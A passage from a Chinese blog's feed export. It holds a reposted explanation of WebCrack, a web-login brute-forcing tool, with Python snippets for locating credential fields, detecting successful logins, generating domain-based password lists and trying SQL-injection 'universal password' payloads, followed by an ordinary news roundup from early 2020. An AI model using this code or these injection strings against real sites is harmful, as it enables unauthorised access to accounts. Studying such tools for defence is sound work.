内容"</span>,</span><br><span class="line">    <span class="attr">"note"</span>: <span class="string">"请保证本文件是 UTF 格式，并且请勿删除此说明"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件里面给出了集中常见的 cms 的配置方案，可进行参考。</p><h2 id="原理分析">原理分析</h2><p>根据我们平时使用burpsuite中的爆破的原理，可知webcrack的爆破原理与其差异不大，自动分析找到爆破点、带入字典进行匹配、判断是否成功。</p><h3 id="寻找爆破点">寻找爆破点</h3><p>根据提取到的参数名来匹配用户名和密码的位置（缺陷：可能不包含在已设定的选项中）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> content.find_all(<span class="string">'input'</span>):</span><br><span class="line">    ok_flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> x.has_attr(<span class="string">'name'</span>):</span><br><span class="line">        parameter = x[<span class="string">'name'</span>]</span><br><span class="line">    <span class="keyword">elif</span> x.has_attr(<span class="string">'id'</span>):</span><br><span class="line">        parameter = x[<span class="string">'id'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parameter = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> x.has_attr(<span class="string">'value'</span>):</span><br><span class="line">        value = x[<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = <span class="string">'0000'</span></span><br><span class="line">    <span class="keyword">if</span> paramter:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user_key:</span><br><span class="line">            <span class="keyword">for</span> z <span class="keyword">in</span> [<span class="string">'user'</span>, <span class="string">'name'</span>, <span class="string">'zhanghao'</span>, <span class="string">'yonghu'</span>, <span class="string">'email'</span>,.<span class="string">'account'</span>]:</span><br><span class="line">                <span class="keyword">if</span> z <span class="keyword">in</span> paramter.lower():</span><br><span class="line">                    value = <span class="string">'&#123;username&#125;'</span></span><br><span class="line">                    user_key = parameter</span><br><span class="line">                    ok_flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ok_flag:</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> [<span class="string">'pass'</span>, <span class="string">'pw'</span>, <span class="string">'mima'</span>]:</span><br><span class="line">                <span class="keyword">if</span> y <span class="keyword">in</span> parameter.lower():</span><br><span class="line">                    value = <span class="string">'&#123;pass_word&#125;'</span></span><br><span class="line">                    pass_key = parameter</span><br><span class="line">                    ok_flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        data[parameter] = str(value)</span><br></pre></td></tr></table></figure><h3 id="判断是否成功">判断是否成功</h3><p>原理就是先对两个错误请求的返回值进行比较，如果不同，则无法进行判断，退出爆破；如果相同，则记录下来作为判断的标准。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_error_length</span><span class="params">(conn, path, data)</span>:</span></span><br><span class="line">    data1 = data</span><br><span class="line">    cookie_error_flag = <span class="number">0</span></span><br><span class="line">    dynamic_reg_len = <span class="number">0</span></span><br><span class="line">    data2 = str(data1.replace(<span class="string">'%7Buser_name%7D'</span>, <span class="string">'admin'</span>))</span><br><span class="line">    data2 = str(data2.replace(<span class="string">'%7Bpass_word%7D'</span>, <span class="string">'length_test'</span>))</span><br><span class="line">    res_test = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="literal">False</span>,</span><br><span class="line">        allow_redirects=<span class="literal">True</span>, proxies=requests_proxies()) <span class="comment"># 先请求一次</span></span><br><span class="line">    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="literal">False</span>,</span><br><span class="line">        allow_redirects=<span class="literal">True</span>, proxies=requests_proxies())</span><br><span class="line">    res_02.encoding = res_02.apparent_encoding</span><br><span class="line">    res = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">True</span>,</span><br><span class="line">        proxies=requests_proxies())</span><br><span class="line">    res.encoding = res.apparent_encoding</span><br><span class="line">    error_length_02 = len(res_02.text + str(res_02.headers))</span><br><span class="line">    error_length = len(res.text + str(res.headers))</span><br><span class="line">    <span class="keyword">if</span> error_length_02 != error_length:</span><br><span class="line">        cookies_error_flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> error_length, cookie_error_flag, dynamic_req_len</span><br></pre></td></tr></table></figure><p>根据黑名单判断，出现黑名单中的情况判定为爆破失败</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fail_words = [<span class="string">'密码错误'</span>, <span class="string">'重试'</span>, <span class="string">'不正确'</span>, <span class="string">'密码有误'</span>,<span class="string">'不成功'</span>, <span class="string">'重新输入'</span>, <span class="string">'history.back'</span>, <span class="string">'不存在'</span>, <span class="string">'登录失败'</span>, <span class="string">'登陆失败'</span>,<span class="string">'出错'</span>, <span class="string">'已被锁定'</span>,<span class="string">'history.go'</span>,<span class="string">'安全拦截'</span>,<span class="string">'还可以尝试'</span>,<span class="string">'无效'</span>,<span class="string">'攻击行为'</span>,<span class="string">'创宇盾'</span>, <span class="string">'非法'</span>,<span class="string">'百度云加速'</span>,<span class="string">'安全威胁'</span>,<span class="string">'防火墙'</span>,<span class="string">'黑客'</span>, <span class="string">'不合法'</span>,<span class="string">'warning.asp?msg='</span>,<span class="string">'Denied'</span>]</span><br></pre></td></tr></table></figure><p>为了提高准确度，防止误报，还有重新检查的环节。就是再次把爆破出的帐号密码发送一次，将返回值与一个新的错误返回值进行对比，如果不同，则表示爆破成功。（为什么不使用前面记录下来的错误返回值进行对比，因为WAF的存在或其他因素的干扰会导致返回值的变化）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recheck</span><span class="params">(path, data, user_name, pass_word)</span>:</span></span><br><span class="line">    data1 = data</span><br><span class="line">    conn = requests.session()</span><br><span class="line">    pass_word = str(pass_word.replace(<span class="string">'&#123;user&#125;'</span>, user_name))</span><br><span class="line"></span><br><span class="line">    data_test = str(data1.replace(<span class="string">'%7Buser_name%7D'</span>, user_name))</span><br><span class="line">    data_test = str(data_test.replace(<span class="string">'%7Bpass_word%7D'</span>, <span class="string">'length_test'</span>))</span><br><span class="line"></span><br><span class="line">    data2 = str(data1.replace(<span class="string">'%7Buser_name%7D'</span>, user_name))</span><br><span class="line">    data2 = str(data2.replace(<span class="string">'%7Bpass_word%7D'</span>, pass_word))</span><br><span class="line"></span><br><span class="line">    res_01 = conn.post(url=path, data=data_test, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="literal">False</span>,</span><br><span class="line">                       allow_redirects=<span class="literal">False</span>, proxies=requests_proxies())</span><br><span class="line">    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=<span class="number">10</span>, verify=<span class="literal">False</span>,</span><br><span class="line">                       allow_redirects=<span class="literal">False</span>, proxies=requests_proxies())</span><br><span class="line">    res_01.encoding = res_01.apparent_encoding</span><br><span class="line">    res_02.encoding = res_02.apparent_encoding</span><br><span class="line">    error_length_01 = len(res_01.text+str(res_01.headers))</span><br><span class="line">    error_length_02 = len(res_02.text+str(res_02.headers))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> error_length_01 == error_length_02:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="动态词典">动态词典</h3><p>根据域名自动生成动态词典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_dynam_dic</span><span class="params">(url)</span>:</span></span><br><span class="line">    dynam_pass_dic = []</span><br><span class="line">    tmp_dic = []</span><br><span class="line">    suffix_dic = [<span class="string">''</span>, <span class="string">'123'</span>, <span class="string">'888'</span>, <span class="string">'666'</span>, <span class="string">'123456'</span>]</span><br><span class="line">    list1 = url.split(<span class="string">'/'</span>)</span><br><span class="line">    host = list1[<span class="number">2</span>].split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    compile_ip = re.compile(<span class="string">'^(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)$'</span>)</span><br><span class="line">    <span class="keyword">if</span> compile_ip.match(host):</span><br><span class="line">        check_ip = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        check_ip = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_ip:</span><br><span class="line">        list2 = host.split(<span class="string">"."</span>)</span><br><span class="line">        i = len(list2)</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> range(i):  <span class="comment"># 生成url字典1</span></span><br><span class="line">            list3 = list2[u:]</span><br><span class="line">            part = <span class="string">'.'</span>.join(list3)</span><br><span class="line">            <span class="keyword">if</span> (len(part) &lt; <span class="number">5</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            dynam_pass_dic.append(part)</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> range(i):  <span class="comment"># 生成url字典2</span></span><br><span class="line">            list3 = list2[u]</span><br><span class="line">            <span class="keyword">if</span> len(list3) &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            tmp_dic.append(list3)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp_dic:</span><br><span class="line">            <span class="keyword">for</span> suffix <span class="keyword">in</span> suffix_dic:</span><br><span class="line">                u = i + suffix</span><br><span class="line">                dynam_pass_dic.append(u)</span><br><span class="line">        <span class="keyword">return</span> dynam_pass_dic</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br></pre></td></tr></table></figure><p>如果输入的是一个 IP，则返回一个空的列表。</p><h3 id="万能密码">万能密码</h3><p>除了弱口令以外，还可能存在万能密码的漏洞，WebCrack中添加了一些常用的payload用来检测是否存在万能密码的漏洞。（缺陷：可能会被WAF拦截）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">exp_user_dic = [<span class="string">"admin' or 'a'='a"</span>, <span class="string">"'or'='or'"</span>, <span class="string">"admin' or '1'='1' or 1=1"</span>, <span class="string">"')or('a'='a"</span>, <span class="string">"'or 1=1--"</span>]</span><br><span class="line">exp_pass_dic = exp_user_dic</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> exp_able:</span><br><span class="line">    user_dic=exp_user_dic</span><br><span class="line">    pass_dic=exp_pass_dic</span><br><span class="line">    print(<span class="string">'Exp_dic is trying'</span>)</span><br><span class="line">    user_name, pass_word = crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id)</span><br><span class="line">    <span class="keyword">if</span> user_name:</span><br><span class="line">        print(<span class="string">"Rechecking......"</span>,url, user_name, pass_word)</span><br><span class="line">        recheck_flag = recheck(path, data, user_name, pass_word)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        recheck_flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    recheck_flag = <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="验证码">验证码</h3><p>这部分自动化完成比较困难，这里只提供了一个简单的解决方案</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">captchas = [<span class="string">'验证码'</span>, <span class="string">'验 证 码'</span>,<span class="string">'点击更换'</span>, <span class="string">'点击刷新'</span>,<span class="string">'看不清'</span>,<span class="string">'认证码'</span>,<span class="string">'安全问题'</span>]</span><br><span class="line"><span class="keyword">if</span> cms_id  <span class="keyword">and</span>  cms[cms_id][<span class="string">'captcha'</span>] == <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"[-] captcha in login page: "</span> + url + <span class="string">'\n'</span>,time.strftime(<span class="string">'%Y-%m-%d %X'</span>, time.localtime(time.time())))</span><br><span class="line">    <span class="keyword">with</span> open(log_file, <span class="string">'a+'</span>) <span class="keyword">as</span> log:</span><br><span class="line">        log.write(<span class="string">"[-] captcha in login page: "</span>  + url + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cms_id :</span><br><span class="line">        <span class="keyword">for</span> captcha <span class="keyword">in</span> captchas:</span><br><span class="line">            <span class="keyword">if</span> captcha <span class="keyword">in</span> html:</span><br><span class="line">                print(<span class="string">"[-]"</span> + captcha + <span class="string">" in login page: "</span> + url + <span class="string">'\n'</span>,time.strftime(<span class="string">'%Y-%m-%d %X'</span>, time.localtime(time.time())))</span><br><span class="line">                <span class="keyword">with</span> open(log_file, <span class="string">'a+'</span>) <span class="keyword">as</span> log:</span><br><span class="line">                    log.write(<span class="string">"[-]"</span> + captcha + <span class="string">" in login page: "</span> + url + <span class="string">'\n'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span></span><br></pre></td></tr></table></figure><hr><p>因为通用型爆破，可能无法做到百分百准确，可以修改配置文件来更符合你的需求。（出现sql错误信息可能存在post注入的情况无法进行爆破）二向箔安全 最近开放了一系列免费的网络安全技能包，通过学习技能不断提升自我能力，在网络安全的世界中不断闯关升级。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这是一篇转载的文章。文章来源是：&lt;a href=&quot;https://zhuanlan.zhihu.com/p/89205738&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://zhuanlan.zhihu.com/p/89205738&lt;/a&gt;&lt;
      
    
    </summary>
    
      <category term="黑客" scheme="http://www.codewoody.com/categories/%E9%BB%91%E5%AE%A2/"/>
    
    
      <category term="linux" scheme="http://www.codewoody.com/tags/linux/"/>
    
      <category term="转载" scheme="http://www.codewoody.com/tags/%E8%BD%AC%E8%BD%BD/"/>
    
      <category term="黑客" scheme="http://www.codewoody.com/tags/%E9%BB%91%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>Weekly-28</title>
    <link href="http://www.codewoody.com/posts/5934/"/>
    <id>http://www.codewoody.com/posts/5934/</id>
    <published>2019-12-30T04:52:05.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<h2 id="新闻">新闻</h2><h3 id="伊朗将军与伊拉克被美军空袭杀死">伊朗将军与伊拉克被美军空袭杀死</h3><p><img src="https://imgs.codewoody.com/uploads/big/77513bce2484c6ab38127447a5093c02.jpg"></p><p>伊拉克国家电视台确认，在美军对巴格达机场的空袭中，伊朗「圣城军」领导人卡西姆·苏莱曼尼少将，伊拉克人民动员委员会副委员长马赫迪·穆罕迪斯，人民动员委员会公共关系主任Muhammad Ridha Al-Jabri全部遇害。</p><p>空袭的命令由特朗普发出，且并未经过国会的同意。</p><p>伊朗事实上的最高军衔是少将，苏莱曼尼少将在伊朗地位超然，直接听命于霍梅尼。</p><p>1 月 5 日，伊朗宣布退出核协议，将不再遵守其与世界大国在2015年签署的核协议中的承诺，这标志着伊核协议形同崩溃。这是可以预见到的必然结果。不过之前美国已经退出了伊朗核协议。<a href="http://www.ftchinese.com/story/001085786" target="_blank" rel="noopener">source</a>。以此为契机伊朗退出核协议，可以说从道义上来讲无可指摘了。</p><h3 id="日产前ceo戈恩出逃日本"><a href="https://www.zhihu.com/question/364152986" target="_blank" rel="noopener">日产前CEO戈恩出逃日本</a></h3><p>此前被日本警方逮捕的全球车坛传奇人物，日产汽车前 CEO 卡洛斯·戈恩（Carlos Ghosn）目前已潜逃出境，成功抵达黎巴嫩老家！</p><p>2018 年 11 月，戈恩被日本警方逮捕，在东京拘留所被羁押了 108 天。2019 年 3 月 6 日，日本检方裁定戈恩以 10 亿日元保释金的代价出狱，高额的保释金令当时的日本舆论侧目。而后戈恩虽然又再次被逮捕，但在 2019 年 4 月 25 日得以保释，并被限制出境。</p><p>虽然戈恩被成功保释，但他在日本的住所依然被警方严密包围监视着。因此戈恩的日方辩护律师认为，潜逃行动需要“很大规模的组织配合”。</p><p>据黎巴嫩当地电视台 MTV 报道，戈恩是在一个圣诞乐队访问他的家后，藏在一个尺寸超大的乐器盒中逃离了日本。</p><p>1 月 2 日，土耳其警方拘留了七人，包括四名飞行员。这七人涉嫌协助戈恩出逃日本，经过土耳其抵达黎巴嫩。<a href="https://cn.reuters.com/article/ntv-turkey-police-ghosn-0102-idCNKBS1Z10LD?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a>。同一天，贝鲁特方面证实，国际刑警组织(Interpol)已向黎巴嫩发出“红色通缉令”，请求该国逮捕卡洛斯•戈恩。但是国际刑警组织又声明：“每个国家自行决定红色通缉令在其境内的法律价值。”<a href="http://www.ftchinese.com/story/001085770" target="_blank" rel="noopener">source</a></p><p><a href="http://www.ftchinese.com/story/001085784" target="_blank" rel="noopener">FT 的报道</a>显示出事情中内有更多玄机。报道中提到，戈恩在日本的律师高野隆(Takashi Takano)在博客中表示，当他得知戈恩逃离日本时，他感到愤怒。但高野隆随后对日本的司法体系进行了直言不讳的批评：“我遭到了背叛，但背叛我的不是卡洛斯•戈恩，”他写道。另一方面，报道中还提到：</p><blockquote><p>知情人士提供的越来越多的证据表明，在这位富豪出逃的前几天，政府和私人机构对他的监视级别有所下降。</p><p>知情人士表示，戈恩的弃保潜逃之旅——核心环节是搭乘私人飞机从大阪飞往伊斯坦布尔——开始时，他只是戴着帽子和口罩从其在东京租住的房子内走出来。他似乎没有被警察、检察官或私家侦探跟踪。</p></blockquote><p>这与之前广为流传的戈恩出逃细节有一定的差异。在之前流传的版本中，戈恩是藏身于乐队的箱子之中离开在东京的住宅，但是这篇报道却说戈恩是简单乔装以后自己走出的住宅，且这位富豪出台的前几天，日本对其监视级别有所下降。如果FT的报道为真，那么戈恩的出逃很可能得到了日本方面的配合。</p><p>1 月 7 日，观察者网援引 6 日《华尔街日报》的报道，也验证了这一说法：根本就没有乐队上门，前日产雷诺公司董事长卡洛斯·戈恩是大摇大摆的走出家门，乘坐新干线、再转乘出租车，藏身于一个超大号的黑色箱子中逃避安检，最终成功逃往黎巴嫩。<a href="https://m.guancha.cn/internation/2020_01_07_530707.shtml" target="_blank" rel="noopener">source</a></p><p>1 月 7 日，东京检方对戈恩的太太发出逮捕令。<a href="http://www.ftchinese.com/story/001085826?exclusive" target="_blank" rel="noopener">source</a></p><h3 id="台湾军方直升机迫降意外多名将官死亡"><a href="http://www.bbc.com/zhongwen/simp/chinese-news-50970359" target="_blank" rel="noopener">台湾军方直升机迫降意外，多名将官死亡</a></h3><p>台湾空军一架UH-60M黑鹰直升机，今天（1月2日）上午在新北市乌来山区发生迫降意外，机上8人死亡，另外有5人生还。机上有多名高级指挥官包括罹难的参谋总长沈一鸣。参谋总长台湾军中职位最高的职务，沈一鸣是台湾有史以来因公殉职的最高级别将领。</p><p>台湾国防部向媒体表示，1月2日上午7时50分，参谋总长沈一鸣等人搭乘黑鹰直升机从台北前往宜兰东澳进行春节慰勉，但因不明原因迫降在新北市山区。</p><p>空军司令熊厚基表示，全机共13人，包括正驾驶、副驾驶及机工长。 上午7时54分，飞机从台北松山区起飞，原定8时20分抵达目的地，但8时7分消失在新北市乌来山区。</p><h3 id="基因编辑婴儿案事主被判3年">基因编辑婴儿案事主被判3年</h3><p>中国“免疫艾滋病基因编辑婴儿”事件在司法层面落幕，主导研究的贺建奎被深圳法院判处三年有期徒刑。</p><h3 id="武汉发现多起不明原因肺炎病例">武汉发现多起不明原因肺炎病例</h3><p>武汉市卫生健康委员会医政医管处发布《关于做好不明原因肺炎救治工作的紧急通知》。通知称，武汉市部分医疗机构陆续出现不明原因肺炎病人。通知要求各医疗机构要及时追踪统计救治情况，并按要求及时上报。目前，国家卫健委专家组已抵达武汉，正展开相关检测核实工作。<a href="https://www.zhihu.com/pin/1195302979551727616" target="_blank" rel="noopener">source</a></p><p>中国中央电视台（CCTV）周二最新报导称，武汉发现病毒性肺炎病例大部分为海鲜城经营户，目前相关病毒分型检测、隔离治疗、终末消毒等工作正在进行。</p><p>“央视新闻”微博报导称，据湖北省相关部门消息，12月以来，武汉市持续开展流感及相关疾病监测，发现病毒性肺炎病例27例，均诊断为病毒性肺炎/肺部感染。其中七例病情危重，其余病例病情可控，两例病情好转拟近期出院。 昨日，武汉市卫生健康委员会医政医管处发布《关于做好不明原因肺炎救治工作的紧急通知》称，武汉市部分医疗机构陆续出现不明原因肺炎病人。通知要求各医疗机构要及时追踪统计救治情况，并按要求及时上报。</p><p>根据央视稍早报导，目前国家卫健委专家组已抵达武汉，正展开相关检测核实工作。<a href="https://cn.reuters.com/article/cctv-china-wuhan-dis-1231-idCNKBS1YZ093" target="_blank" rel="noopener">source</a></p><h3 id="中俄伊三国联合军演"><a href="https://www.bbc.com/zhongwen/simp/world-50923924" target="_blank" rel="noopener">中俄伊三国联合军演</a></h3><p>中国国防部周四表示，中国、伊朗、俄罗斯在本周五举行联合军事演习，演习地点在印度洋北部的阿曼湾。演习将持续四天。<strong>这是三国40年来首次举行联合军演</strong>。</p><p>国防部新闻发言人吴谦说，“中国将派西宁号导弹驱逐舰参加，此次演习旨在深化三国海军之间的交流合作。展示三方共同维护世界和平与海上安全，积极构建‘海洋命运共同体’的良好意愿和能力。”</p><p>阿曼湾是非常敏感的战略航道，它与霍尔姆斯海峡相连，全球约五分之一的石油通过阿曼湾和霍尔姆斯海峡运输。</p><p>以下内容来自布热津斯基的《大棋局》<a href="https://www.zhihu.com/question/347254034/answer/956027963" target="_blank" rel="noopener">source</a></p><blockquote><p>一些俄国评论家猜测，普里马科夫的倾向可能会促成一个以三个在削弱美国在欧亚大陆首要地位问题上有最大地缘政治利益的大国为核心的新的“反霸”联盟。普里马科夫上台伊始的几次出访及讲话加深了这一印象。而且现有的中国与伊朗的武器贸易关系，以及俄国愿与伊朗合作加快其获得核能源的倾向，与更紧密的政治对话和最终的结盟是完全符合的。这一结果至少在理论上可以把世界上最主要的斯拉夫大国、世界上最好战的伊斯兰大国及世界上人口最多力量最强的亚洲大国结合在一起，形成一个强有力的联盟。</p><p>且现有的中国与伊朗的武器贸易关系，以及俄国愿与伊朗合作加快其获得核能源的倾向，与更紧密的政治对话和最终的结盟是完全符合的。这一结果至少在理论上可以把世界上最主要的斯拉夫大国、世界上最好战的伊斯兰大国及世界上人口最多力量最强的亚洲大国结合在一起，形成一个强有力的联盟。</p><p><strong>但是，只有在美国十分短视地同时对中国和伊朗采取敌视政策时，把俄国与 中国及伊朗结合在一起的联盟才能搞得起来。这样的结局当然不能排除</strong></p></blockquote><h3 id="其他">其他</h3><h4 id="国内">国内</h4><ul><li>国家市场监督管理总局令第21号:《药品、医疗器械、保健食品、特殊医学用途配方食品广告审查管理暂行办法》已于2019年12月13日经国家市场监督管理总局2019年第16次局务会议审议通过，现予公布，自2020年3月1日起施行。</li><li>中国成都秋雨圣约教会主任牧师王怡被当局关押一年多后，周一（12月30日）因煽动颠覆国家政权罪和非法经营罪获刑9年，没收财产5万元。<a href="http://www.bbc.com/zhongwen/simp/chinese-news-50948041" target="_blank" rel="noopener">source</a></li><li>中国最大的钾肥生产商青海盐湖工业股份有限公司「被迫」在淘宝上拍卖原价值超过 25 亿美元的资产和股票，以免明年从深圳证券交易所退市。<a href="http://www.ftchinese.com/story/001085729" target="_blank" rel="noopener">source</a></li><li>香港「法轮功」组织一号人物简鸿章病亡。<a href="https://www.guancha.cn/politics/2019_12_30_530001.shtml" target="_blank" rel="noopener">source</a></li><li>台湾通过《反渗透法》。<a href="http://www.ftchinese.com/story/001085736" target="_blank" rel="noopener">source</a></li><li>李铁正式出任中国男足主帅。<a href="https://www.zhihu.com/question/364292914" target="_blank" rel="noopener">source</a></li><li>长江所专家正式宣告，「中国淡水鱼之王」长江白鲟已经与2005-2010年间灭绝。<a href="https://www.zhihu.com/question/364374536" target="_blank" rel="noopener">source</a></li><li>香港中联办主任王志民被免职，骆惠宁被任命为新的香港中联办主任。<a href="https://www.dw.com/zh/香港中联办主任换人-此次任命有别以往？/a-51887297?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li></ul><h4 id="国际">国际</h4><ul><li>从 2020 年 1 月起的一年内，中国和印度的游客将享有免签证入境大马的便利，逗留期最长为15天。游客必须在相关移民局电子系统内登记注册，并持有往返本国或去往第三国机票及足够的资金。</li><li>特朗普称中美将在 1 月 15 日签第一阶段协议。<a href="http://www.bbc.com/zhongwen/simp/chinese-news-50961250" target="_blank" rel="noopener">source</a></li><li>在上一次登月失败之后，印度再接再厉，计划于2020年实施第三次登月任务(「月船三号」)。载人航天飞行计划则将于2021年下半年实施。<a href="https://www.dw.com/zh/印度批准-月船三号-登月计划/a-51852258?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>驻伊拉克大使馆遇袭以后，美国向中东增派 750 名士兵。<a href="https://www.dw.com/zh/驻伊拉克大使馆遇袭后，美国向中东增兵/a-51850932?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>太平洋岛国帕劳成为全球首个禁用防晒霜的国家，理由是对珊瑚和海洋生物有害。<a href="http://www.bbc.com/zhongwen/simp/chinese-news-50972489" target="_blank" rel="noopener">source</a></li><li>美国海军和陆军禁止士兵使用 Tik Tok (抖音海外版)。<a href="https://www.dw.com/zh/视tiktok为网络威胁-美海陆军相继发禁令/a-51886782?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>印尼洪水泛滥成灾，死亡人数已经升至60人。数万人无家可归。<a href="https://www.dw.com/zh/印尼洪水泛滥-数万人无家可归/a-51887384?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>中国留学生在美国机场因带癌细胞样品出境被抓。<a href="https://www.zhihu.com/question/364679571" target="_blank" rel="noopener">source</a></li></ul><h4 id="科技">科技</h4><ul><li>Nvidia 公司的 CUDA 计算平台将不再支持 Mac。<a 